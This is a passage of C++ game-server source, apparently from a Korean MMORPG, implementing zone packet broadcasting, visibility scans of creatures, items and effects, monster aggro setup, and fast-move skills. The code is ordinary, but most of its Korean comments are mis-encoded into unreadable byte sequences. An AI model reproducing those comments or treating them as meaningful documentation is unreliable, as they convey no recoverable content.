	__END_PROFILE_ZONE("Z_BC_SKILL")

	return cList;

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// (x,y)  »ç°» º ö Ž, creatureList ¿¡ µ ©ž®³ž ¿ žðµç PC µé¿¡° 
// ¶» ºê·µå³º®Ž.
//
// *NOTE*
// ö Tile Magic °æ¿ì Plus ž True· µ° µžç Plus º¯ö°¡ True °æ¿ì..
// Magic ¹ü§ ¹öž§ žž­ Žõ ¹ü§ž ®å¿© ºž³»Ž.. ±¿ª ž¶¹ý ©ž®ö Ÿ°í,
// ¿°úûž· ºž¿©±â §Ž.
//
// *CAUTION*
//
// unsigned char ž ZoneCoord_t · »ç¿ë ¶§, overflow ¹ underflow ž  °
//////////////////////////////////////////////////////////////////////////////
void Zone::broadcastPacket(ZoneCoord_t cx, ZoneCoord_t cy, Packet* pPacket, const list<Creature *> & creatureList, bool Plus, Range_t Range)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_EXCLIST")

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
#endif
	pPacket->writeHeaderNBody( outputStream );
	
	ZoneCoord_t ix = 0;
	ZoneCoord_t iy = 0;
	ZoneCoord_t endx = 0;
	ZoneCoord_t endy = 0;

	//////////////////////////////////////////////////////////////////////////////
	// ·ç º¯ö ±â­..
	//
	// Plus º¯ö°¡ ü °æ¿ì Range žž­ Žõ ºž³» Ž..
	// ±¿ª ž¶¹ý °á°úž ¿°úûž· ºž¿©±â §Ž.
	//
	// *NOTE
	// - û­ž Žžé VisionInfo¿¡ PLUS_SIGHT¶óŽ º¯öž °¡¿© ¿¬»ê
	//////////////////////////////////////////////////////////////////////////////
	endx = min(m_Width - 1, cx + maxViewportWidth + 1 + Range);
	endy = min(m_Height - 1, cy + maxViewportLowerHeight  + 1 + Range);

	for (ix =  max(0, cx - maxViewportWidth - 1 - Range); ix <= endx ; ix++) 
	{
		for (iy = max(0, cy - maxViewportUpperHeight - 1 -  Range); iy <= endy ; iy++) 
		{
			if ( VisionInfoManager::getVisionState( ix, iy, cx, cy ) == OUT_OF_SIGHT || Plus ) continue;
			Tile& rTile = m_pTiles[ix][iy]; // by sigi. 2002.5.8

			// ž¿¡ ©ž®³°¡ Ž °æ¿ì¿¡žž
			if (rTile.hasCreature()) 
			{
				const list<Object*> & objectList = rTile.getObjectList();
				list<Object*>::const_iterator itr = objectList.begin();

                for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; itr++) 
				{
					Creature* pCreature = dynamic_cast<Creature*>(*itr);
					Assert(pCreature != NULL);

					// PCžé­, creatureList¿¡ µöµµ Ÿžžé­, (x,y)ž º ö Ž °æ¿ì
					if (pCreature->isPC()) 
					{
						bool belong = false;
						for (list<Creature*>::const_iterator itr = creatureList.begin() ; itr != creatureList.end() ; itr++) 
						{
							if (pCreature == *itr) 
							{
								belong = true;
								break;
							}
						} // for

//						if ((!belong && pCreature->getVisionState(cx,cy) >= IN_SIGHT) ||(!belong && Plus)) 
						if ( !belong )
						{
							//pCreature->getPlayer()->sendPacket(pPacket);
							pCreature->getPlayer()->sendStream( &outputStream );
						} // if
					} // if

				} // for
			}//if
		}//for
	}//for

	__END_PROFILE_ZONE("Z_BC_EXCLIST")

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// pushBroadcastPacket
// ö¿¬ ºê·µå³º®¥¿¡ ºê·µå³º® ¶ °¡
//////////////////////////////////////////////////////////////////////////////
void Zone::pushBroadcastPacket( Packet* pPacket, BroadcastFilter* pFilter )
	throw(Error)
{
	__BEGIN_TRY

	__ENTER_CRITICAL_SECTION( m_MutexBroadcast )

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream* pStream = new SocketEncryptOutputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
	pStream->setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream* pStream = new SocketOutputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
#endif

	pPacket->writeHeaderNBody( *pStream );

	m_BroadcaseQueue.push_back( PairFilterStream( pFilter == NULL ? NULL : pFilter->Clone(), pStream ) );

	__LEAVE_CRITICAL_SECTION( m_MutexBroadcast )

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// flushBroadcastPacket
// ö¿¬ ºê·µå³º®¥ ¶» ºê·µå³º®Ž.
//////////////////////////////////////////////////////////////////////////////
void Zone::flushBroadcastPacket()
	throw(Error)
{
	__BEGIN_TRY

	__ENTER_CRITICAL_SECTION( m_MutexBroadcast )

	list<PairFilterStream>::iterator itr = m_BroadcaseQueue.begin();
	list<PairFilterStream>::iterator endItr = m_BroadcaseQueue.end();

	for ( ; itr != endItr; ++itr )
	{
		BroadcastFilter* pFilter = itr->first;
#ifdef __USE_ENCRYPTER__
		SocketEncryptOutputStream* pStream = itr->second;
#else
		SocketOutputStream* pStream = itr->second;
#endif

		if ( pStream == NULL )
		{
			filelog("ZoneBug.txt", "Zone::flushBroadcastPacket : SocketOutputStream is NULL" );
			SAFE_DELETE( pFilter );
			SAFE_DELETE( pStream );
			continue;
		}

		map<ObjectID_t, Creature*> PCs = m_pPCManager->getCreatures();
		map<ObjectID_t, Creature*>::iterator pcItr = PCs.begin();
		map<ObjectID_t, Creature*>::iterator pcEndItr = PCs.end();

		for ( ; pcItr != pcEndItr; ++pcItr )
		{
			GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pcItr->second->getPlayer());
			Assert( pGamePlayer != NULL );

			if ( pFilter == NULL || pFilter->isSatisfy(pGamePlayer) )
			{
				pGamePlayer->sendStream( pStream );
			}
		}
		
		SAFE_DELETE( pFilter );
		SAFE_DELETE( pStream );
	}

	m_BroadcaseQueue.clear();

	__LEAVE_CRITICAL_SECTION( m_MutexBroadcast )

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// scan
// (x,y)¿¡­ Ÿ ¿µ¿ªŸ¿¡ žçŽ žðµç °Žµé ºžž ¹Ÿ¿Ž.
//////////////////////////////////////////////////////////////////////////////
void Zone::scan (Creature* pPC, ZoneCoord_t cx, ZoneCoord_t cy, Packet* pPacket)
	throw (ProtocolException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_SCAN")

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
#endif
	pPacket->writeHeaderNBody( outputStream );

	Assert(pPC->isPC());

	Player* pPlayer = pPC->getPlayer();
	Assert(pPlayer);

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
//			bool bCanSeeThere = (pPC->getVisionState(ix, iy) >= IN_SIGHT);	// øö Ÿžžž· º ö ³ª?
			if ( pPC->getVisionState( ix, iy ) == OUT_OF_SIGHT ) continue;
			
			const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

			for (list<Object*>::const_iterator itr = objectList.begin() ; itr != objectList.end() ; itr++) 
			{
				Assert(*itr != NULL);

				//--------------------------------------------------------------------------------
				//
				// °¢ °Ž OBJECT CLASS¿¡ µû¶ó­ û GCAddXXX ¶» žžµéŸî­
				// owner ¿¡° üŽ. 
				//
				// *NOTES*
				//
				// °¡å âö ®·ü ³ôº °Ž CLASS °¡ case Ÿºº¿¡ ³ª¿Ÿ Ž.
				//
				//--------------------------------------------------------------------------------
				switch ((*itr)->getObjectClass()) 
				{
					//--------------------------------------------------------------------------------
					// ž §¿¡ ©ž®³°¡ » °æ¿ì
					//--------------------------------------------------------------------------------
					case Object::OBJECT_CLASS_CREATURE :
						{
							//--------------------------------------------------------------------------------
							// PC °æ¿ì pPacket» üŸ žç, !PC °æ¿ì¿¡Ž ü ¿ä°¡ ŸøŽ.
							// ¶ žðµç ©ž®³ ºžž owner¿¡° üŸ Ž.
							//--------------------------------------------------------------------------------
							Creature* pCreature = dynamic_cast<Creature*>(*itr);
							Assert(pCreature != NULL);

							if (pCreature == pPC)	// ±â  ºžŽ ¹» ¿ä°¡ ŸøŽ.
								continue;

							// Ÿºžžé 
//							if ( !canSee( pPC, pCreature ) ) continue;
							bool bCanSee = canSee( pPC, pCreature );

							switch (pCreature->getCreatureClass()) 
							{
								case Creature::CREATURE_CLASS_MONSTER :
									{
										Monster* pMonster = dynamic_cast<Monster*>(pCreature);
										if (bCanSee)
										{
											// by sigi
											Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pPC );

											if (pAddMonsterPacket!=NULL)
											{
												pPlayer->sendPacket( pAddMonsterPacket );

												delete pAddMonsterPacket;
											}
										}

										//--------------------------------------------------------------------------------
										// žóº°¡ PC ž º ö Ž °æ¿ì, PC ž žóº Enemy · öŽ.
										//--------------------------------------------------------------------------------
										VisionState vs = pMonster->getVisionState(cx,cy);
	
										// Aggressive žóº °æ¿ì¿¡žž ûž· µî·Ž.
										if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE) 
										{
											if (isPotentialEnemy(pMonster, pPC))
											{
												pMonster->addPotentialEnemy(pPC);
											}
										}
									}
									break;

								case Creature::CREATURE_CLASS_SLAYER :
									{
										// ³»°¡ ±°÷» º ö Žžé(darkness¿ °ü·¿©)
										if (bCanSee)
										{	
//											if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)
//												&& !pCreature->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE) || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) )
//													|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeSniping( pCreature ) ) )
//											{
												Slayer* pSlayer = dynamic_cast<Slayer*>(pCreature);
												GCAddSlayer gcAddSlayer;
												makeGCAddSlayer(&gcAddSlayer, pSlayer);
												pPlayer->sendPacket(&gcAddSlayer);
//											}
										}

										// »óŽë(·¹Ÿî)°¡ ³ªž º ö Žžé	
										if (pPacket && pCreature->getVisionState(cx, cy) >= IN_SIGHT) 
										{
											Assert(pCreature->getPlayer() != NULL);
											// canSee · Žë. 2003.05.29 by bezz
											if ( canSee( pCreature, pPC ) )
											{
												//pCreature->getPlayer()->sendPacket(pPacket);
												pCreature->getPlayer()->sendStream( &outputStream );
											}
										}
									}
									break;
		
								case Creature::CREATURE_CLASS_VAMPIRE :
									{
										if (bCanSee)
										{
											// PC°¡ ObservingEye å®ž °¡ö°í Žžé å®ž °¡®¿Ž.
//											EffectObservingEye* pEffectObservingEye = NULL;
//											if ( pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//											{
//												pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//												//Assert( pEffectObservingEye != NULL );
//											}

											if (pCreature->isFlag(Effect::EFFECT_CLASS_HIDE)) 
											{
								//				if (!pPC->isFlag(Effect::EFFECT_CLASS_GHOST)
								//					&& (pPC->isVampire() 
								//						|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN))
								//					)
								//				{
													GCAddBurrowingCreature gcABC;
													gcABC.setObjectID(pCreature->getObjectID());
													gcABC.setName(pCreature->getName());
													gcABC.setX(ix);
													gcABC.setY(iy);

													pPlayer->sendPacket(&gcABC);
								//				}	
											} 
											else 
											{
								//				if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)
								//					&& (!pCreature->isFlag(Effect::EFFECT_CLASS_INVISIBILITY)
								//						|| pPC->isVampire() 
								//						|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY)
								//						|| ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pCreature ) ) )
								//					)
								//				{
													Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
													GCAddVampire gcAddVampire;
													makeGCAddVampire(&gcAddVampire, pVampire);
													pPlayer->sendPacket(&gcAddVampire);
								//				}
											}
										}
		
										// »óŽë°¡ ³ªž º ö Žžé..
										// »óŽëŽ vampire¹· Ÿžž °¡ŽŽžé darkness¿Ž °ü°è°¡ ŸøŽ. 	
										// ¹ìŸî°¡ »óŽë¶© º³ª žðµå¶óžé ýŽë žø º»Ž...
										//
										// ±µ¥ scan ö ¯º»ó snipping žðµåž  ö Ÿ°í ³Ÿî°¥ öŽ ŸøŽ.
										// canSee· Žë
										if (pPacket && pCreature->getVisionState(cx, cy) >= IN_SIGHT && canSee( pCreature, pPC )) 
										{
											Assert(pCreature->getPlayer() != NULL);
											//pCreature->getPlayer()->sendPacket(pPacket);
											pCreature->getPlayer()->sendStream(&outputStream);
										}
									}
									break;

								case Creature::CREATURE_CLASS_OUSTERS :
									{
										if (bCanSee)
										{
											// PC°¡ ObservingEye å®ž °¡ö°í Žžé å®ž °¡®¿Ž.
//											EffectObservingEye* pEffectObservingEye = NULL;
//											if ( pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//											{
//												pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//												//Assert( pEffectObservingEye != NULL );
//											}

//											if ( !pCreature->isFlag(Effect::EFFECT_CLASS_GHOST) )
//											{
												Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);
												GCAddOusters gcAddOusters;
												makeGCAddOusters(&gcAddOusters, pOusters);
												pPlayer->sendPacket(&gcAddOusters);
//											}
										}

										if ( pPacket && pCreature->getVisionState(cx, cy) >= IN_SIGHT && canSee( pCreature, pPC ) )
										{
											Assert( pCreature->getPlayer() != NULL );
											//pCreature->getPlayer()->sendPacket(pPacket);
											pCreature->getPlayer()->sendStream(&outputStream);
										}
									}
									break;
		
								case Creature::CREATURE_CLASS_NPC :
									{
										if (bCanSee)
										{
											NPC* pNPC = dynamic_cast<NPC*>(pCreature);
											GCAddNPC gcAddNPC;
											makeGCAddNPC(&gcAddNPC, pNPC);
											pPlayer->sendPacket(&gcAddNPC);
										}
									}
									break;
		
								default :
									throw Error("invalid creature class");
	
							}//switch (pCreature->getCreatureClass())
						}//case Object::OBJECT_CLASS_CREATURE :
	
						break;

					//--------------------------------------------------------------------------------
					// ž §¿¡ Ÿ » °æ¿ì
					//--------------------------------------------------------------------------------
					case Object::OBJECT_CLASS_ITEM :
						{
//							if (bCanSeeThere)
//							{
								Item* pItem = dynamic_cast<Item*>(*itr);

								if (pItem->getItemClass() == Item::ITEM_CLASS_CORPSE) 
								{
									switch (pItem->getItemType()) 
									{
										case SLAYER_CORPSE :
											{
												SlayerCorpse* pSlayerCorpse = dynamic_cast<SlayerCorpse*>(pItem);
												GCAddSlayerCorpse gcAddSlayerCorpse;
												makeGCAddSlayerCorpse(&gcAddSlayerCorpse, pSlayerCorpse);
												pPlayer->sendPacket(&gcAddSlayerCorpse);
											}
											break;
										case VAMPIRE_CORPSE :
											{
												VampireCorpse* pVampireCorpse = dynamic_cast<VampireCorpse*>(pItem);
												GCAddVampireCorpse gcAddVampireCorpse;
												makeGCAddVampireCorpse(&gcAddVampireCorpse, pVampireCorpse);
												pPlayer->sendPacket(&gcAddVampireCorpse);
											}
											break;
										case OUSTERS_CORPSE :
											{
												OustersCorpse* pOustersCorpse = dynamic_cast<OustersCorpse*>(pItem);
												GCAddOustersCorpse gcAddOustersCorpse;
												makeGCAddOustersCorpse(&gcAddOustersCorpse, pOustersCorpse);
												pPlayer->sendPacket(&gcAddOustersCorpse);
											}
											break;
										case NPC_CORPSE :
											{
												throw UnsupportedError(__PRETTY_FUNCTION__);
											}
											break;
										case MONSTER_CORPSE :
											{
												MonsterCorpse* pMonsterCorpse = dynamic_cast<MonsterCorpse*>(pItem);
												GCAddMonsterCorpse gcAddMonsterCorpse;
												makeGCAddMonsterCorpse(&gcAddMonsterCorpse, pMonsterCorpse, ix, iy);
												pPlayer->sendPacket(&gcAddMonsterCorpse);

												sendRelicEffect( pMonsterCorpse, pPlayer );
											}
											break;
									}//switch
								}
								else if (pItem->getItemClass() == Item::ITEM_CLASS_MINE && pItem->isFlag(Effect::EFFECT_CLASS_INSTALL))
								{	
									if (pPC->isFlag(Effect::EFFECT_CLASS_REVEALER) )
									{
										GCAddInstalledMineToZone gcAddMine;
										
										makeGCAddInstalledMineToZone(&gcAddMine, pItem, cx, cy);
										
										pPlayer->sendPacket(&gcAddMine);
									}
								}
							   	else 
								{
									GCAddNewItemToZone gcAddNewItemToZone;
									makeGCAddNewItemToZone(&gcAddNewItemToZone, pItem, ix, iy);
									pPlayer->sendPacket(&gcAddNewItemToZone);
								}
//							}
						}
						break;

					//--------------------------------------------------------------------------------
					// ž §¿¡ å®°¡ » °æ¿ì
					//--------------------------------------------------------------------------------
					case Object::OBJECT_CLASS_EFFECT :
						{
							Effect* pEffect = dynamic_cast<Effect*>(*itr);
//							if (bCanSeeThere)
//							{
								if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_VAMPIRE_PORTAL)
								{
									EffectVampirePortal* pEffectVampirePortal = dynamic_cast<EffectVampirePortal*>(pEffect);
									ZONE_COORD zonecoord = pEffectVampirePortal->getZoneCoord();

									GCAddVampirePortal gcAddVampirePortal;
									gcAddVampirePortal.setObjectID(pEffect->getObjectID());
									gcAddVampirePortal.setOwnerID(pEffectVampirePortal->getOwnerID());
									gcAddVampirePortal.setX(ix);
									gcAddVampirePortal.setY(iy);
									gcAddVampirePortal.setTargetZoneID(zonecoord.id);
									gcAddVampirePortal.setTargetX(zonecoord.x);
									gcAddVampirePortal.setTargetY(zonecoord.y);
									gcAddVampirePortal.setDuration(pEffectVampirePortal->getRemainDuration());
									gcAddVampirePortal.setCreateFlag(0);

									pPlayer->sendPacket(&gcAddVampirePortal);
								}
								// by sigi. 2002.6.10
								else if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_SANCTUARY)
								{
									EffectSanctuary* pEffectSanctuary = dynamic_cast<EffectSanctuary*>(pEffect);

									ZoneCoord_t centerX = pEffectSanctuary->getCenterX();
									ZoneCoord_t centerY = pEffectSanctuary->getCenterY();
									
									// sanctuaryŽ ¥ °æ¿ìžž packet» ºž³Ž.
									if (centerX==ix && centerY==iy)
									{
										GCAddEffectToTile gcAddEffectToTile;

										gcAddEffectToTile.setObjectID(pEffect->getObjectID());
										gcAddEffectToTile.setXY(ix, iy); 
										gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
										gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

										pPlayer->sendPacket(&gcAddEffectToTile);
									}
								}
								// Broadcasting Effect ö © °¡ by Sequoia 2003.3.31
								else if (pEffect->isBroadcastingEffect())
								{
									GCAddEffectToTile gcAddEffectToTile;

									gcAddEffectToTile.setObjectID(pEffect->getObjectID());
									gcAddEffectToTile.setXY(ix, iy); 
									gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
									gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

									pPlayer->sendPacket(&gcAddEffectToTile);
								}
//							}
						}
						break;


					//--------------------------------------------------------------------------------
					// ž §¿¡ åŸ¹° » °æ¿ì
					//--------------------------------------------------------------------------------
					case Object::OBJECT_CLASS_OBSTACLE :
						{
							/*
							*/
						}
						break;

					//--------------------------------------------------------------------------------
					// ž §¿¡ ÷» » °æ¿ì
					//--------------------------------------------------------------------------------
					case Object::OBJECT_CLASS_PORTAL :
						{
							/*
							*/
						}
						break;

					default :
						throw Error("invalid object class");

				}//switch ((*itr)->getObjectClass())
			}//for
			
		}//for
	}//for

	__END_PROFILE_ZONE("Z_SCAN")

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// žóº°¡ ž (x,y)¿¡ »õ· ž®šµŸú» °æ¿ì, Ÿ ¿µ¿ªŸ¿¡ žçŽ žðµç PCµé¿¡°
// GCAddXXX ¶» ºž³»žé­, µ¿¿¡ ± PC ž áçû ûž· °£Ž.
//////////////////////////////////////////////////////////////////////////////
void Zone::scanPC (Creature* pCreature)
	throw (ProtocolException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_SCAN_PC")

	Monster* pMonster = NULL;

	Assert(pCreature != NULL);

	ZoneCoord_t cx = pCreature->getX();
	ZoneCoord_t cy = pCreature->getY();

	Packet*                pGCAddXXX = NULL;

	// ©ž® Ÿ·ù¿¡ µû¶ó, ¶» žžµéŸîµŽ.
	Creature::CreatureClass CClass = pCreature->getCreatureClass();

	bool isMonster = pCreature->isMonster();
//	bool isMonsterHide = false;
//	bool isMonsterInvisibility = false;

	if (CClass == Creature::CREATURE_CLASS_MONSTER)
	{
		pMonster = dynamic_cast<Monster*>(pCreature);

		// by sigi
		pGCAddXXX = createMonsterAddPacket( pMonster, NULL );

//		isMonsterHide = pMonster->isFlag(Effect::EFFECT_CLASS_HIDE);
//		isMonsterInvisibility = pMonster->isFlag(Effect::EFFECT_CLASS_INVISIBILITY);

		/*
		if (pCreature->isFlag(Effect::EFFECT_CLASS_HIDE))
		{
			gcABC.setObjectID(pMonster->getObjectID());
			gcABC.setName(pMonster->getName());
			gcABC.setX(cx);
			gcABC.setY(cy);
			pGCAddXXX = &gcABC;
		}
		else
		{
			makeGCAddMonster(&gcAddMonster, pMonster);
			pGCAddXXX = &gcAddMonster;
		}
		*/
	}
	else if (CClass == Creature::CREATURE_CLASS_NPC)
	{
		NPC* pNPC = dynamic_cast<NPC*>(pCreature);

		GCAddNPC* pGCAddNPC = new GCAddNPC;

		makeGCAddNPC(pGCAddNPC, pNPC);

		pGCAddXXX = pGCAddNPC;
	}
	else 
	{
		Assert(false);
	}

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
			list<Object*>::const_iterator itr = objectList.begin();

			for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE ; itr++) 
			{
				if ((*itr)->getObjectClass() == Object::OBJECT_CLASS_CREATURE)
				{
					Creature* pPC = dynamic_cast<Creature*>(*itr);
					Assert(pPC != NULL);

					// PC žé­, ©ž®³ž º ö Ž °æ¿ì
					if (pPC->isPC() && pPC->getVisionState(cx,cy) >= IN_SIGHT
						&& canSee( pPC, pCreature ))
//						&& !pPC->isFlag(Effect::EFFECT_CLASS_GHOST)
					{
						// Creature °¡ Revealer å®ž °¡ö°í Žžé å®ž °¡®¿Ž.
//						EffectRevealer* pEffectRevealer = NULL;
//						if ( pCreature->isFlag( Effect::EFFECT_CLASS_REVEALER ) )
//						{
//							pEffectRevealer = dynamic_cast<EffectRevealer*>(pCreature->findEffect( Effect::EFFECT_CLASS_REVEALER ) );
//							Assert( pEffectRevealer );
//						}
						
						// Creature °¡ ObservingEye å®ž °¡ö°í Žžé å®ž °¡®¿Ž.
//						EffectObservingEye* pEffectObservingEye = NULL;
//						if ( pCreature->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//						{
//							pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pCreature->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//							//Assert( pEffectObservingEye != NULL );
//						}

						// žóº°¡ º³ª» Ÿµž®Ž ŸøŽ ±·¡­ DETECT_HIDDEN°ú INVISIBILITYžž © Ž.
//						if (pPC->isVampire() ||
//							((!isMonsterHide || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN))// || ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pMonster ) ) )
//							&& (!isMonsterInvisibility || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) ) || ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pMonster ) )) 
//							)
//						{
							pPC->getPlayer()->sendPacket(pGCAddXXX);
//						}

						if (isMonster )
						{
							// (cx,cy)¿¡ Ž žóº°¡ (ix,iy)¿¡ Ž PCž º ö Ž°¡?
							VisionState vs = pMonster->getVisionState(ix,iy);
							if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE && canSee( pCreature, pPC )) 
							{
								if (isPotentialEnemy(pMonster, pPC))
								{
									pMonster->addPotentialEnemy(pPC);
								}
							}
						}
					}

				} // if (creature)

			} // for itr

		} // for y
	} // for x

	if (pGCAddXXX != NULL)
	{
		delete pGCAddXXX;
	}

	__END_PROFILE_ZONE("Z_SCAN_PC")

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// P(x1,y1)¿¡­ Q(x2,y2)· ºüž¥ µ¿ ©ž®³°¡ º¯ ¿µ¿ª¿¡ žçŽ PCµé¿¡° 
// ºê·µå³º®Ž žîµåŽ.
// for Skill FlashSliding, ShadowWalk
//////////////////////////////////////////////////////////////////////////////
bool Zone::moveFastPC(Creature* pPC, ZoneCoord_t x1, ZoneCoord_t y1, ZoneCoord_t x2, ZoneCoord_t y2, SkillType_t skillType)
	throw (ProtocolException, Error)
{
	__BEGIN_TRY 
	__BEGIN_DEBUG

	//  žîµåŽ PC ž Žë»óž· Ž.
	Assert(pPC->isPC());
	
	// isAbleToMove · ¹²Ž. by bezz. 2002.12.28
	if ( !isAbleToMove( pPC ) )
		return false;

/*	if ( SiegeManager::Instance().isSiegeZone( m_ZoneID ) )
	{
		if ( !isPassLine( this, pPC->getX(), pPC->getY(), x2, y2, true ) ) return false;
	}*/

	 // º¹°» °¡ö°í Ž °æ¿ì¶óžé.. ŸüöŽë¿¡ µéŸî°¥ ö ŸøŽ.
	if (pPC->hasRelicItem())
	{
#ifdef __CONTRIBUTION_SYSTEM__
		if(!(pPC->isFlag(Effect::EFFECT_CLASS_SLAYER_HERO_ITEM) || pPC->isFlag(Effect::EFFECT_CLASS_VAMPIRE_HERO_ITEM) || pPC->isFlag(Effect::EFFECT_CLASS_OUSTERS_HERO_ITEM)
			|| pPC->isFlag(Effect::EFFECT_CLASS_SLAYER_LEVELWAR_HERO_ITEM) || pPC->isFlag(Effect::EFFECT_CLASS_VAMPIRE_LEVELWAR_HERO_ITEM) || pPC->isFlag(Effect::EFFECT_CLASS_OUSTERS_LEVELWAR_HERO_ITEM)))
#endif
			return false;
	}

	if (pPC->isFlag(Effect::EFFECT_CLASS_HAS_FLAG) || pPC->isFlag( Effect::EFFECT_CLASS_HAS_SWEEPER))
		return false;

	if ( m_ZoneID == 1410 || m_ZoneID == 1411 ) return false;

	Tile& rTile = getTile( x1, y1 );

	if ( rTile.getEffect( Effect::EFFECT_CLASS_ON_BRIDGE ) != NULL ) return false;

	// ûŽç Ÿøö¡» £ŽŽ.
	// üžéº¿¡­ ûŽç ö¡..4°³ °»ö
	Dir_t dir = calcDirection(x1, y1, x2, y2);

	// g_FastMoveSearchX, Y· £žžé µŽ. by sigi. 2002.5.8
	int* searchX = g_FastMoveSearchX[dir];
	int* searchY = g_FastMoveSearchY[dir];

	// ºó žö ®.
	int i=0;
	for(i = 0; i< 4; i++)
	{
		int targetX = x2 + searchX[i], targetY = y2 + searchY[i];
		if (targetX >= 0 && targetX < m_Width && targetY >= 0 && targetY < m_Height && 
			!m_pTiles[targetX][targetY].isBlocked(pPC->getMoveMode()) && !m_pTiles[targetX][targetY].hasPortal() &&
			// Sanctuary °¡ °·ö ŸŸŸ Ž. by Sequoia 2003.3.25
			m_pTiles[targetX][targetY].getEffect(Effect::EFFECT_CLASS_SANCTUARY) == NULL &&
			m_pTiles[x1][y1].getEffect(Effect::EFFECT_CLASS_SANCTUARY) == NULL
		)
		{
			x2 = targetX;
			y2 = targetY;
			break;
		}
	}
	if (i == 4) 
	{
		return false;	// ºóž» žø£ŸŽ!
	}
	
	Player* pPlayer = pPC->getPlayer();
	Assert(pPlayer);

	GCFastMove gcFastMove;
	gcFastMove.setObjectID(pPC->getObjectID());
	gcFastMove.setXY(x1, y1, x2, y2);
	gcFastMove.setSkillType( skillType );

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + gcFastMove.getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + gcFastMove.getPacketSize() + 2 );
#endif
	gcFastMove.writeHeaderNBody( outputStream );

	pPlayer->sendStream( &outputStream );

	// ùº®..
	dynamic_cast<PlayerCreature*>(pPC)->getGQuestManager()->fastMove();

	//////////////////////////////////////////////////////////////
	// move Ÿ·ù....
	// ¿¡µû¶ó GCDelete³ª Addµî» ºž³»Ÿ  ö µµ Ž.
	
	// PC ¥ º¯°æ.
	pPC->setXYDir(x2, y2, dir);
	// ü ž¿¡­ ©ž®³ž »èŽ.

	try {
		m_pTiles[x1][y1].deleteCreature(pPC->getObjectID());	
	} catch (Error& e) {
		filelog("assertTile.txt", "moveFastPC : %s", e.toString().c_str());
		throw;
	}

	// »õ ž¿¡ ©ž®³ž °¡Ž.
	m_pTiles[x2][y2].addCreature(pPC);

	try {
		checkMine(this, pPC, x2, y2);
		checkTrap(this, pPC);
	} catch ( Throwable & t ) {
